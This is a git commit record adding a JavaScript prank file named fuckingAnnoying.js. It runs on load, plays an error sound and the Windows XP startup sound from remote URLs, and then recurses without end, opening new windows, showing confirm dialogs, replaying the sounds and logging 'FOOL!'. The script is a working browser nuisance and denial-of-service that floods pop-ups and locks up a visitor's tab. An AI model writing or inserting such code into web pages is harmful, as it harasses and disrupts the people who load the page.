3acb6ff37ea416ee4ed46c43e4ce111570e5b7f0
Hooman <Hooman1130@users.noreply.github.com>
2021-02-12 10:44:02 -0500

    Javascripto

---
+++ js/fuckingAnnoying.js
@@ -0,0 +1,25 @@
+function fuckingAnnoying() {
+    var error = new Audio('https://www.myinstants.com/media/sounds/erro.mp3');
+    var xp = new Audio ('https://www.winhistory.de/more/winstart/mp3/winxp.mp3');
+    error.play();xp.play();
+    function soundo() {
+        error.play();
+        xp.play();
+    }
+    function infiny() {
+        open("./.");
+        soundo();
+        document.querySelector("body").onclick = soundo();
+        soundo();
+        if (confirm("")) {
+            soundo();
+        } else {
+            soundo();
+        }
+        soundo();
+        console.log("FOOL!");
+        infiny();
+    }
+    infiny();
+}
+fuckingAnnoying();
